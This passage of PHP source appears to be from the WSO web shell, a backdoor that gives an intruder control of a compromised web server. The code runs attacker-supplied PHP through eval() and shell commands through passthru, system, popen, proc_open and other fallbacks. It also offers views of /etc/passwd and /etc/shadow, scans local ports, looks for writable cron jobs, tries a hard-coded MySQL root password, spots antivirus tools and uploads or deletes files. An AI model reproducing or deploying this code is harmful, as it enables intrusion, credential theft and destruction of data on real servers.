			$group = "?";

		} else {

			$uid = @posix_getpwuid(posix_geteuid());

			$gid = @posix_getgrgid(posix_getegid());

			$user = $uid['name'];

			$uid = $uid['uid'];

			$group = $gid['name'];

			$gid = $gid['gid'];

		}

		$m = array('Sec. Info' => 'SecInfo', 'Files' => 'FilesMan', 'Console' => 'Console', 'Sql' => 'Sql', 'Php' => 'Php', 'String tools' => 'StringTools', 'Bruteforce' => 'Bruteforce', 'Network' => 'Network');

		$menu = '';

		foreach ($m as $k => $v) $menu.= '<th width="' . (int)(100 / count($m)) . '%"><h1><a href="#" onclick="g(\'' . $v . '\',null,\'\',\'\',\'\'); return !1;">[ ' . $k . ' ]</a></h1></th>';

		echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr>

				<td><span>Uname:<br>Server IP:<br>User:<br>Php:<br>Hardware:<br></span></td>' . '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href="#" title="' . $explink . '" onclick="g(\'Console\',null,this.title);return false;">[exploit-suggester v2]</a></nobr><br>

				<u class="copy" title="' . $_SERVER["SERVER_ADDR"] . '">' . $_SERVER["SERVER_ADDR"] . '</u> (' . $ip_data . '), <span>' . $domains_count . '</span> domains. <a href="https://securitytrails.com/list/ip/' . @$_SERVER["SERVER_ADDR"] . '">[ securitytrails ]</a> <a href="https://www.virustotal.com/gui/ip-address/' . $_SERVER["SERVER_ADDR"] . '">[ virustotal (' . $vt_detections . '/56) ]</a> <a href="https://publicwww.com/websites/ip%3A' . $_SERVER["SERVER_ADDR"] . '/">[ publicwww ]</a><br>

				' . $uid . ' ( ' . $user . ' ) <span>Group:</span> ' . $gid . ' ( ' . $group . ' )' . ($open_base_dir || $chains_bypassed === true ? ', <span>Open base dir:</span> ' . $open_base_dir . ' (' . ($chains_bypassed === true ? '<a class="text-green">bypassed</a>' : $chains_bypassed) . ')' : '') . '<br>

				' . @phpversion() . ' <span>Safe mode:</span> ' . ($GLOBALS['safe_mode'] ? '<font class=text-red>ON</font>' : '<font class=text-green><b>OFF</b></font>') . ' <a href=# onclick="g(\'Php\',null,\'\',\'info\')">[ phpinfo ]</a><br>

				<span>disk:</span> total ' . wsoViewSize($totalSpace) . ', free ' . wsoViewSize($freeSpace) . ' (' . (int)($freeSpace / $totalSpace * 100) . '%), <span>ram</span> total: ' . $ram_size . ', free: ' . $ram_free . ', <span>cores:</span> ' . (file_exists('/proc/cpuinfo') ? substr_count('' . @file_get_contents('/proc/cpuinfo'), "processor") : '--') . ', <span>loadavg:</span> ' . substr(end(@sys_getloadavg()), 0, 4) . '</td>' . '<td width=200></td></tr></table>' .

				'<table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%><tr>' . $menu . '</tr></table><div style="margin:5">';

	}

	function wsoFooter() {

		echo "

					</div>

				<script src='//aels.github.io/textarea-editor/textarea-editor.js'></script>

				<script>

					Clipboard = function(){ var a;return{copy:function(b){a=document.createElement('textArea');a.value=b;document.body.appendChild(a);if(navigator.userAgent.match(/ipad|iphone/i)){b=document.createRange();b.selectNodeContents(a);var c=window.getSelection();c.removeAllRanges();c.addRange(b);a.setSelectionRange(0,999999)}else a.select();document.execCommand('copy');document.body.removeChild(a)}} }();

					document.querySelectorAll('.copy').forEach(function(a){ a.onclick = function() {

						Clipboard.copy(a.title.replace(/(\\[ | \\])/g,''));

						a.classList.add('text-green');

						setTimeout(function(){a.classList.remove('text-green')},1e3);

						return false;

					}});

					document.querySelectorAll('input[type=checkbox]').forEach(function(a){a.onclick=function(){document.querySelector('.file-actions').style.display='table-cell'}});

					document.querySelectorAll('input[type=checkbox]').forEach(function(a){a.onclick=function(){document.querySelector('.file-actions').style.display='table-cell'}});

					document.querySelectorAll('input.touch-field[type=text]').forEach(function(a){a.onkeydown=function(e){if(e.keyCode===13&&this.value){ g('FilesTools',null,this.title,'touch',this.value);this.classList.add('text-green'); return false; }}});

					document.querySelectorAll('#mkdir').forEach(function(a){ a.onclick = function(e) { g('FilesMan',null,prompt('enter directory name'),'mkdir'); mkdir.classList.add('text-green'); return false; }});

					document.querySelectorAll('#mkfile').forEach(function(a){ a.onclick = function(e) { g('FilesTools',null,prompt('enter file name'),'mkfile'); mkfile.classList.add('text-green'); return false; }});

					document.querySelectorAll('#uploadfile').forEach(function(a){ a.onchange = function(e) { if(this.value) { uploadfile.form.submit(); uploadfile.classList.add('text-green'); } }});

					tryToSave = function(e) {

						if( (e.metaKey||e.ctrlKey) && (e.keyCode==0xA||e.keyCode==0xD) ) {

							g(null,null,textarea.title,'edit',textarea.value);

							e.preventDefault();

							return false;

						}

					};

					tryToRun = function(e) {

						if( (e.metaKey||e.ctrlKey) && (e.keyCode==0xA||e.keyCode==0xD) ) {

							a('Php',null,PhpCode.value);

							PhpCode.classList.add('text-green');

							setTimeout(function(){PhpCode.classList.remove('text-green')},1e3);

							e.preventDefault();

							return false;

						}

					};

				</script>

			</div>

			</body></html>";

	}

	if (!function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid') === false)) {

		function posix_getpwuid($p) {

			return false;

		}

	}

	if (!function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid') === false)) {

		function posix_getgrgid($p) {

			return false;

		}

	}

	function wsoGetOpenPorts() {

		$address = '127.0.0.1';

		$ports = '1,3,4,6,7,9,13,17,19,20,21,22,23,24,25,26,30,32,33,37,42,43,49,53,70,79,80,81,82,83,84,85,88,89,90,99,100,106,109,110,111,113,119,125,135,139,143,144,146,161,163,179,199,211,212,222,254,255,256,259,264,280,301,306,311,340,366,389,406,407,416,417,425,427,443,444,445,458,464,465,481,497,500,512,513,514,515,524,541,543,544,545,548,554,555,563,587,593,616,617,625,631,636,646,648,666,667,668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800,801,808,843,873,880,888,898,900,901,902,903,911,912,981,987,990,992,993,995,999,1000,1001,1002,1007,1009,1010,1011,1021,1022,1023,1024,1025,1026,1027,1028,1029,1030,1031,1032,1033,1034,1035,1036,1037,1038,1039,1040,1041,1042,1043,1044,1045,1046,1047,1048,1049,1050,1051,1052,1053,1054,1055,1056,1057,1058,1059,1060,1061,1062,1063,1064,1065,1066,1067,1068,1069,1070,1071,1072,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1086,1087,1088,1089,1090,1091,1092,1093,1094,1095,1096,1097,1098,1099,1100,1102,1104,1105,1106,1107,1108,1110,1111,1112,1113,1114,1117,1119,1121,1122,1123,1124,1126,1130,1131,1132,1137,1138,1141,1145,1147,1148,1149,1151,1152,1154,1163,1164,1165,1166,1169,1174,1175,1183,1185,1186,1187,1192,1198,1199,1201,1213,1216,1217,1218,1233,1234,1236,1244,1247,1248,1259,1271,1272,1277,1287,1296,1300,1301,1309,1310,1311,1322,1328,1334,1352,1417,1433,1434,1443,1455,1461,1494,1500,1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687,1688,1700,1717,1718,1719,1720,1721,1723,1755,1761,1782,1783,1801,1805,1812,1839,1840,1862,1863,1864,1875,1900,1914,1935,1947,1971,1972,1974,1984,1998,1999,2000,2001,2002,2003,2004,2005,2006,2007,2008,2009,2010,2013,2020,2021,2022,2030,2033,2034,2035,2038,2040,2041,2042,2043,2045,2046,2047,2048,2049,2065,2068,2082,2083,2099,2100,2103,2105,2106,2107,2111,2119,2121,2126,2135,2144,2160,2161,2170,2179,2190,2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2375,2376,2381,2382,2383,2393,2394,2399,2401,2492,2500,2522,2525,2557,2601,2602,2604,2605,2607,2608,2638,2701,2702,2710,2717,2718,2725,2800,2809,2811,2869,2875,2909,2910,2920,2967,2968,2998,3000,3001,3003,3005,3006,3007,3011,3013,3017,3030,3031,3052,3071,3077,3128,3168,3211,3221,3260,3261,3268,3269,3283,3300,3301,3306,3322,3323,3324,3325,3333,3351,3367,3369,3370,3371,3372,3389,3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689,3690,3703,3737,3766,3784,3800,3801,3809,3814,3826,3827,3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000,4001,4002,4003,4004,4005,4006,4045,4111,4125,4126,4129,4224,4242,4279,4321,4343,4443,4444,4445,4446,4449,4550,4567,4662,4848,4899,4900,4998,5000,5001,5002,5003,5004,5009,5030,5033,5050,5051,5054,5060,5061,5080,5087,5100,5101,5102,5120,5190,5200,5214,5221,5222,5225,5226,5269,5280,5298,5357,5405,5414,5431,5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678,5679,5718,5730,5800,5801,5802,5810,5811,5815,5822,5825,5850,5859,5862,5877,5900,5901,5902,5903,5904,5906,5907,5910,5911,5915,5922,5925,5950,5952,5959,5960,5961,5962,5963,5987,5988,5989,5998,5999,6000,6001,6002,6003,6004,6005,6006,6007,6009,6025,6059,6100,6101,6106,6112,6123,6129,6156,6346,6379,6389,6502,6510,6543,6547,6565,6566,6567,6580,6646,6666,6667,6668,6669,6689,6692,6699,6778,6779,6788,6789,6792,6839,6881,6901,6969,7000,7001,7002,7004,7007,7019,7025,7070,7100,7103,7106,7200,7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777,7778,7800,7911,7920,7921,7937,7938,7999,8000,8001,8002,8007,8008,8009,8010,8011,8021,8022,8031,8042,8045,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8093,8099,8100,8180,8181,8192,8193,8194,8200,8222,8254,8290,8291,8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651,8652,8654,8701,8800,8873,8888,8899,8994,9000,9001,9002,9003,9009,9010,9011,9040,9050,9071,9080,9081,9090,9091,9099,9100,9101,9102,9103,9110,9111,9200,9207,9220,9290,9415,9418,9485,9500,9502,9503,9535,9575,9593,9594,9595,9618,9666,9876,9877,9878,9898,9900,9917,9929,9943,9944,9968,9998,9999,10000,10001,10002,10003,10004,10009,10010,10012,10024,10025,10082,10180,10215,10243,10566,10616,10617,10621,10626,10628,10629,10778,11110,11111,11211,11967,12000,12174,12265,12345,13456,13722,13782,13783,14000,14238,14441,14442,15000,15002,15003,15004,15660,15742,16000,16001,16012,16016,16018,16080,16113,16992,16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221,20222,20828,21571,22939,23502,24444,27017,27018,24800,25734,25735,26214,27000,27352,27353,27355,27356,27715,28201,30000,30718,30951,31038,31337,32768,32769,32770,32771,32772,32773,32774,32775,32776,32777,32778,32779,32780,32781,32782,32783,32784,32785,33354,33899,34571,34572,34573,35500,38292,40193,40911,41511,42510,44176,44442,44443,44501,45100,48080,49152,49153,49154,49155,49156,49157,49158,49159,49160,49161,49163,49165,49167,49175,49176,49400,49999,50000,50001,50002,50003,50006,50300,50389,50500,50636,50800,51103,51493,52673,52822,52848,52869,54045,54328,55055,55056,55555,55600,56737,56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389';

		$db = wsoGetFile('https://bit.ly/port2service');

		$ports = explode(',', $ports);

		$open_ports = '';

		foreach ($ports as $port) {

			$connection = @fsockopen($address, $port, $errno, $errstr, 3);

			if (is_resource($connection)) {

				fclose($connection);

				preg_match_all("#Service Name: ((?!unknown).+),Port No: $port,Protocol: tcp#", $db, $matches);

				$open_ports.= $port . ': ' . (isset($matches[1]) ? end($matches[1]) : 'unknown') . "\n";

			}

		}

		try{

			$it = @glob("/tmp/*.sock");

			foreach ($it as $f) {

				$open_ports.= $f . "\n";

			}

			$it = @glob("/var/run/*.sock");

			foreach ($it as $f) {

				$open_ports.= $f . "\n";

			}

			$it = @glob("/run/*/*.sock");

			foreach ($it as $f) {

				$open_ports.= $f . "\n";

			}

		}

		catch(Exception $e) {

		}

		return $open_ports;

	}

	function wsoGetCronJobs() {

		$cron_tabs = array("/var/spool/cron/crontabs/*","/etc/cron.*/*","/etc/cronta*");

		$files = array();

		try{

			foreach ($cron_tabs as $dir) {

				foreach (@glob($dir) as $file) {

					if( @is_readable($file) ) {

						if( @is_writeable($file) ) {

							$files[$file][] = 'writable';

						}

						foreach(@file($file) as $line) {

							$matches = null;

							preg_match('# (/\S+) #i', $line, $matches);

							if( isset($matches[1]) && @is_file($matches[1]) && @is_writable($matches[1]) ) {

								$files[$file][] = $matches[1];

							}

						}

					}

				}

			}

		}

		catch(Exception $e) {

		}

		$writable_cron_jobs = '';

		foreach ($files as $cron_file => $target_files) {

			$writable_cron_jobs .= $cron_file.': '.implode(', ', $target_files)."\n";

		}

		return $writable_cron_jobs;

	}

	function wsoEx($in) {

		try {

			$out = '';

			if (function_exists('passthru')) {

				ob_start();

				@passthru($in);

				$out = ob_get_clean();

			}

			elseif (function_exists('system')) {

				ob_start();

				@system($in);

				$out = ob_get_clean();

			}

			elseif (function_exists('shell_exec')) {

				$out = shell_exec($in);

			}

			elseif (is_resource($f = @popen($in, "r"))) {

				$out = "";

				while (!@feof($f)) $out.= fread($f, 1024);

				pclose($f);

			}

			elseif (function_exists('exec')) {

				@exec($in, $out);

				$out = @join("\n", $out);

			}

			elseif (function_exists('proc_open')) {

				$descriptorspec = array( 0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w") );

				$process = proc_open($in, $descriptorspec, $pipes, null, null);

				if (is_resource($process)) {

					fclose($pipes[0]);

					$out = stream_get_contents($pipes[1]);

					$out .= stream_get_contents($pipes[2]);

					fclose($pipes[1]);

					fclose($pipes[2]);

					proc_close($process);

				}

			}

			elseif (function_exists('expect_popen')) {

				$out = @file_get_contents('expect://' . $in);

			}

			elseif ( PHPVERSION[0]==7 && PHPVERSION<'7.4.26' || PHPVERSION[0]==8 && PHPVERSION<'8.0.13' ) {

				global $wsoExGentlyUrl;

				if( $wsoExGentlyUrl ) {

					ob_start();

					echo wsoExGently($in);

					$out = ob_get_clean();

					$wsoExGentlyUrl = '';

				}

			}

			else {

				$out = "Can't exec commands. But we still have PHP!";

			}

		}

		catch(Exception $e) {

			$out = $e->getMessage();

		}

		return $out;

	}

	function wsoViewSize($s) {

		if ($s >= 1073741824) return sprintf('%1.2f', $s / 1073741824) . ' GB';

		elseif ($s >= 1048576) return sprintf('%1.2f', $s / 1048576) . ' MB';

		elseif ($s >= 1024) return sprintf('%1.2f', $s / 1024) . ' KB';

		else return $s . ' B';

	}

	function wsoPerms($p) {

		if (($p & 0xC000) == 0xC000) $i = 's';

		elseif (($p & 0xA000) == 0xA000) $i = 'l';

		elseif (($p & 0x8000) == 0x8000) $i = '-';

		elseif (($p & 0x6000) == 0x6000) $i = 'b';

		elseif (($p & 0x4000) == 0x4000) $i = 'd';

		elseif (($p & 0x2000) == 0x2000) $i = 'c';

		elseif (($p & 0x1000) == 0x1000) $i = 'p';

		else $i = 'u';

		$i.= (($p & 0x0100) ? 'r' : '-');

		$i.= (($p & 0x0080) ? 'w' : '-');

		$i.= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));

		$i.= (($p & 0x0020) ? 'r' : '-');

		$i.= (($p & 0x0010) ? 'w' : '-');

		$i.= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));

		$i.= (($p & 0x0004) ? 'r' : '-');

		$i.= (($p & 0x0002) ? 'w' : '-');

		$i.= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));

		return $i;

	}

	function wsoPermsColor($f) {

		if (!@is_readable($f)) return '<font class=text-red>' . wsoPerms(@fileperms($f)) . '</font>';

		elseif (!@is_writable($f)) return '<font color=white>' . wsoPerms(@fileperms($f)) . '</font>';

		else return '<font class=text-green>' . wsoPerms(@fileperms($f)) . '</font>';

	}

	function wsoPermsColorOnly($f) {

		if (!@is_readable($f)) return '#f18260';

		elseif (!@is_writable($f)) return '#fff';

		else return '#2bb24c';

	}

	function wsoScandir($dir) {

		if (function_exists("scandir")) {

			return scandir($dir);

		} else {

			$dh = opendir($dir);

			while (false !== ($filename = readdir($dh))) $files[] = $filename;

			return $files;

		}

	}

	function actionSecInfo() {

		wsoHeader();

		echo '<h1>Server security information</h1><div class=content>';

		function wsoSecParam($n, $v) {

			$v = trim($v);

			if ($v) {

				echo '<span>' . $n . ': </span>';

				if (strpos($v, "\n") === false) echo $v . '<br>';

				else echo '<pre class=ml1>' . $v . '</pre>';

				flush();

			}

		}

		wsoSecParam('Server software', @getenv('SERVER_SOFTWARE'));

		if (function_exists('apache_get_modules')) wsoSecParam('Loaded Apache modules', implode(', ', apache_get_modules()));

		wsoSecParam('Disabled PHP Functions', $GLOBALS['disable_functions'] ? $GLOBALS['disable_functions'] : 'none');

		wsoSecParam('Open base dir', @ini_get('open_basedir'));

		wsoSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));

		wsoSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));

		wsoSecParam('cURL support', function_exists('curl_version') ? 'enabled' : 'no');

		wsoSecParam('Open ports & sockets', wsoGetOpenPorts());

		echo '<br>';

		wsoSecParam('Writable cron jobs', wsoGetCronJobs());

		echo '<br>';

		$temp = array();

		try {

			$res = @new PDO("mysql:host=localhost;", 'root', 'mayflowerr');

		}

		catch(Exception $e) {

			if (preg_match('/Access denied/i', $e->getMessage())) $temp[] = "MySql (PDO)";

		}

		if (@class_exists('Redis')) {

			try {

				$redis = new Redis();

				$redis->connect('127.0.0.1', 6379);

				$status = $redis->info()['redis_version'];

			}

			catch(Exception $e) {

				$status = $e->getMessage();

			}

			$temp[] = "Redis (".$status.")";

		}

		if (@function_exists('mssql_connect')) $temp[] = "MSSQL";

		if (@function_exists('pg_connect')) $temp[] = "PostgreSQL";

		if (@function_exists('oci_connect')) $temp[] = "Oracle";

		wsoSecParam('Supported databases', implode(', ', $temp));

		echo '<br>';

		preg_match('/"domains":\[(.+)\]/', wsoGetFile("http://bit.ly/geo133t"), $matches);

		wsoSecParam('Domains', str_replace(',', "\n", str_replace('"', '', isset($matches[1])?$matches[1]:'no domains on this host')));

		echo '<br>';

		if ($GLOBALS['os'] == 'nix') {

			wsoSecParam('Readable /etc/passwd', @is_readable('/etc/passwd') ? "yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>" : 'no');

			wsoSecParam('Readable /etc/shadow', @is_readable('/etc/shadow') ? "yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"shadow\")'>[view]</a>" : 'no');

			wsoSecParam('OS version', @file_get_contents('/proc/version'));

			wsoSecParam('Distr name', @file_get_contents('/etc/issue.net'));

			echo '<br>';

			if (!$GLOBALS['safe_mode']) {

				$userful = array('gcc', 'lcc', 'cc', 'ld', 'make', 'php', 'perl', 'python', 'ruby', 'tar', 'gzip', 'bzip', 'bzip2', 'nc', 'locate', 'suidperl');

				$userful_exists = array();

				$danger = array('kav', 'nod32', 'bdcored', 'uvscan', 'sav', 'drwebd', 'clamd', 'rkhunter', 'chkrootkit', 'iptables', 'ipfw', 'tripwire', 'shieldcc', 'portsentry', 'snort', 'ossec', 'lidsadm', 'tcplodg', 'sxid', 'logcheck', 'logwatch', 'sysmask', 'zmbscap', 'sawmill', 'wormscan', 'ninja');

				$danger_exists = array();

				$downloaders = array('wget', 'fetch', 'lynx', 'links', 'curl', 'get', 'lwp-mirror');

				$downloaders_exists = array();

				foreach (explode(':', getenv('PATH')?getenv('PATH'):'/usr/local/bin:/usr/bin:/usr/sbin') as $path) {

					foreach ($userful as $bin_name) {

						if( bindtextdomain(rand(1e5,1e6), $path.'/'.$bin_name) ) $userful_exists[] = $bin_name;

					}

					foreach ($danger as $bin_name) {

						if( bindtextdomain(rand(1e5,1e6), $path.'/'.$bin_name) ) $danger_exists[] = $bin_name;

					}

					foreach ($downloaders as $bin_name) {

						if( bindtextdomain(rand(1e5,1e6), $path.'/'.$bin_name) ) $downloaders_exists[] = $bin_name;

					}

				}

				wsoSecParam('Userful', implode(', ', $userful_exists));

				wsoSecParam('Danger', implode(', ', $danger_exists));

				wsoSecParam('Downloaders', implode(', ', $downloaders_exists));

				$interesting = array("/etc/os-release", "/etc/passwd", "/etc/shadow", "/etc/group", "/etc/issue", "/etc/issue.net", "/etc/motd", "/etc/sudoers", "/etc/hosts", "/etc/aliases","/proc/version", "/etc/resolv.conf", "/etc/sysctl.conf","/etc/named.conf", "/etc/network/interfaces", "/etc/squid/squid.conf", "/usr/local/squid/etc/squid.conf","/etc/ssh/sshd_config","/etc/httpd/conf/httpd.conf", "/usr/local/apache2/conf/httpd.conf", " /etc/apache2/apache2.conf", "/etc/apache2/httpd.conf", "/usr/pkg/etc/httpd/httpd.conf", "/usr/local/etc/apache22/httpd.conf", "/usr/local/etc/apache2/httpd.conf", "/var/www/conf/httpd.conf", "/etc/apache2/httpd2.conf", "/etc/httpd/httpd.conf","/etc/lighttpd/lighttpd.conf", "/etc/nginx/nginx.conf","/etc/fstab", "/etc/mtab", "/etc/crontab", "/etc/cron.d/", "/var/spool/cron/crontabs", "/etc/inittab", "/etc/modules.conf", "/etc/modules");

				$interesting_exists = array();

				foreach ($interesting as $path) {

					if( bindtextdomain(rand(1e5,1e6), $path) ) $interesting_exists[] = $path;

				}

				wsoSecParam('Interesting', implode("\n", $interesting_exists));

				echo '<br/>';

				wsoSecParam('HDD space', wsoEx('df -h'));

				wsoSecParam('Hosts', @file_get_contents('/etc/hosts'));

				echo '<br/><span>posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value=">>"></form>';

				if (isset($_POST['p2'], $_POST['p3']) && is_numeric($_POST['p2']) && is_numeric($_POST['p3'])) {

					$temp = "";

					for (;$_POST['p2'] <= $_POST['p3'];$_POST['p2']++) {

						$uid = @posix_getpwuid($_POST['p2']);

						if ($uid) $temp.= join(':', $uid) . "\n";

					}

					echo '<br/>';

					wsoSecParam('Users', $temp);

				}

			}

		} else {

			wsoSecParam('OS Version', wsoEx('ver'));

			wsoSecParam('Account Settings', wsoEx('net accounts'));

			wsoSecParam('User Accounts', wsoEx('net user'));

		}

		echo '</div>';

		wsoFooter();

	}

	function actionPhp() {

		if (isset($_POST['ajax'])) {

			WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', true);

			ob_start();

			try {

				eval($_POST['p1']);

			}

			catch(Exception $e) {

				echo $e->getMessage();

			}

			$temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='" . addcslashes(htmlspecialchars(ob_get_clean()), "\n\r\t\\'\0") . "';\n";

			echo strlen($temp), "\n", $temp;

			exit;

		}

		if (empty($_POST['ajax']) && !empty($_POST['p1'])) WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0);

		wsoHeader();

		if (isset($_POST['p2']) && ($_POST['p2'] == 'info')) {

			echo '<h1>PHP info</h1><div class=content><style>.p {color:#000;}</style>';

			ob_start();

			phpinfo();

			$tmp = ob_get_clean();

			$tmp = preg_replace(array('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU', '!td, th {(.*)}!msiU', '!<img[^>]+>!msiU',), array('', '.e, .v, .h, .h th {$1}', ''), $tmp);

			echo str_replace('<h1', '<h2', $tmp) . '</div><br>';

		}

		echo '<h1>Execution PHP-code</h1>

		<div class=content><form name=pf method=post onsubmit="a(\'Php\',null,PhpCode.value);return false;" onkeydown="tryToRun(event,this)">

		<textarea name=code class=bigarea id=PhpCode>' . (!empty($_POST['p1']) ? htmlspecialchars($_POST['p1']) : '') . '</textarea>

		<span>Use [ /CTRL+Enter ] to run</span>';

		echo ' <input type=hidden name=ajax value=1></form><pre id=PhpOutput style="' . (empty($_POST['p1']) ? 'display:none;' : '') . 'margin-top:5px;" class=ml1>';

		if (!empty($_POST['p1'])) {

			ob_start();

			try {

				eval($_POST['p1']);

			}

			catch(Exception $e) {

				echo $e->getMessage();

			}

			echo htmlspecialchars(ob_get_clean());

		}

		echo '</pre></div>';

		wsoFooter();

	}

	function actionFilesMan() {

		if (is_file($_POST['c'])) {

			$_POST['c'] = preg_match('#^/#', $_POST['c'])?$_POST['c']:$GLOBALS['cwd'].$_POST['c'];

			$_POST['c'] = explode('/', $_POST['c']);

			$_POST['p1'] = array_pop($_POST['c']);

			$_POST['c'] = implode('/', $_POST['c']);

			actionFilesTools();

			die();

		}

		if (!empty($_COOKIE['f'])) {

			$_COOKIE['f'] = @unserialize($_COOKIE['f']);

		}

		if (!empty($_POST['p1'])) {

			switch ($_POST['p1']) {

				case 'uploadFile':

					if (!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name'])) echo "Can't upload file!";

					break;

				case 'mkdir':

					if (!@mkdir($_POST['p2'])) echo "Can't create new dir";

					break;

				case 'delete':

					function deleteDir($file_path) {

						$file_path = (substr($file_path, -1) == '/') ? $file_path : $file_path . '/';

						$dh = opendir($file_path);

						while (($item = readdir($dh)) !== false) {

							$item = $file_path . $item;

							if ((basename($item) == "..") || (basename($item) == ".")) continue;

							$type = filetype($item);

							if ($type == "dir") deleteDir($item);

							else @unlink($item);

						}

						closedir($dh);

						@rmdir($file_path);

					}

					if (is_array(@$_POST['f'])) foreach ($_POST['f'] as $f) {

						if ($f == '..') continue;

						$f = urldecode($f);

						if (is_dir($f)) deleteDir($f);

						else @unlink($f);

					}

					break;

				case 'paste':

					if ($_COOKIE['act'] == 'copy') {

						function copy_paste($c, $s, $d) {

							if (is_dir($c . $s)) {

								mkdir($d . $s);

								$h = @opendir($c . $s);

								while (($f = @readdir($h)) !== false) if (($f != ".") and ($f != "..")) copy_paste($c . $s . '/', $f, $d . $s . '/');

							} elseif (is_file($c . $s)) @copy($c . $s, $d . $s);

						}

						foreach ($_COOKIE['f'] as $f) copy_paste($_COOKIE['c'], $f, $GLOBALS['cwd']);

					} elseif ($_COOKIE['act'] == 'move') {

						function move_paste($c, $s, $d) {

							if (is_dir($c . $s)) {

								mkdir($d . $s);

								$h = @opendir($c . $s);

								while (($f = @readdir($h)) !== false) if (($f != ".") and ($f != "..")) copy_paste($c . $s . '/', $f, $d . $s . '/');

							} elseif (@is_file($c . $s)) @copy($c . $s, $d . $s);

						}

						foreach ($_COOKIE['f'] as $f) @rename($_COOKIE['c'] . $f, $GLOBALS['cwd'] . $f);

					} elseif ($_COOKIE['act'] == 'zip') {

						if (class_exists('ZipArchive')) {

							$zip = new ZipArchive();

							if ($zip->open($_POST['p2'], 1)) {

								chdir($_COOKIE['c']);

								foreach ($_COOKIE['f'] as $f) {

									if ($f == '..') continue;

									if (@is_file($_COOKIE['c'] . $f)) $zip->addFile($_COOKIE['c'] . $f, $f);

									elseif (@is_dir($_COOKIE['c'] . $f)) {

										$iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f . '/'));

										foreach ($iterator as $key => $value) {

											$zip->addFile(realfile_path($key), $key);

										}

									}

								}

								chdir($GLOBALS['cwd']);

								$zip->close();

							}

						}

					} elseif ($_COOKIE['act'] == 'unzip') {

						if (class_exists('ZipArchive')) {

							$zip = new ZipArchive();

							foreach ($_COOKIE['f'] as $f) {

								if ($zip->open($_COOKIE['c'] . $f)) {

									$zip->extractTo($GLOBALS['cwd']);

									$zip->close();

								}

							}

						}

					} elseif ($_COOKIE['act'] == 'tar') {

						chdir($_COOKIE['c']);

						$_COOKIE['f'] = array_map('escapeshellarg', $_COOKIE['f']);

						wsoEx('tar cfzv ' . escapeshellarg($_POST['p2']) . ' ' . implode(' ', $_COOKIE['f']));

						chdir($GLOBALS['cwd']);

					}

					unset($_COOKIE['f']);

					setcookie('f', '', time() - 3600);

					break;

				default:

					if (!empty($_POST['p1'])) {

						WSOsetcookie('act', $_POST['p1']);

						WSOsetcookie('f', serialize(@$_POST['f']));

						WSOsetcookie('c', @$_POST['c']);

					}

					break;

				}

			}

			wsoHeader();

			wsoBreadCrumps();

			echo '<div class=content><script>p1_=p2_=p3_="";</script>';

			$dirContent = wsoScandir(isset($_POST['c']) ? $_POST['c'] : $GLOBALS['cwd']);

			if ($dirContent === false) {

				echo 'Can\'t open this folder!';

				wsoFooter();

				return;

			}

			global $sort;

			$sort = array('name', 1);

			if (!empty($_POST['p1'])) {

				if (preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match)) $sort = array($match[1], (int)$match[2]);

			}

			echo "<script>

					function sa() {

						for(i=0;i<d.files.elements.length;i++) {

							d.files.elements[i].checked = d.files.elements[i].type=='checkbox'?d.files.elements[0].checked:false;

						}

					}

				</script>

				<table width='100%' class='main' cellspacing='0' cellpadding='2'>

				<form name=files method=post>

				<tr>

				<th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th>

				<th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_" . ($sort[1] ? 0 : 1) . "\")'>Name</a></th>

				<th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_" . ($sort[1] ? 0 : 1) . "\")'>Size</a></th>

				<th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_" . ($sort[1] ? 0 : 1) . "\")'>Modify</a></th>

				<th>Owner/Group</th>

				<th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_" . ($sort[1] ? 0 : 1) . "\")'>Permissions</a></th>

				<th>Actions</th>

				</tr>";

			$dirs = $files = array();

			$n = count($dirContent);

			for ($i = 0;$i < $n;$i++) {

				$ow = @posix_getpwuid(@fileowner($dirContent[$i]));

				$gr = @posix_getgrgid(@filegroup($dirContent[$i]));

